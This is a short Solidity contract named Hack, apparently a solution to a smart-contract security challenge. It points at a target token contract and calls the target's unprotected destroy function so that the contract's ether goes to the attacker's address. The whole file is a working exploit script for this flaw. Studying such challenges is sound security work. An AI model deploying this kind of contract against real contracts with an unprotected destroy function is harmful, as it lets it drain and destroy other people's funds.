// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface simpleToken{
    function destroy(address) external;
}

contract Hack{
    simpleToken public target;
    address payable me;

    constructor(address payable _victim){
        target = simpleToken(_victim);
        me = payable(msg.sender);
    }

    function attack() external payable{
        target.destroy(me);
    }
}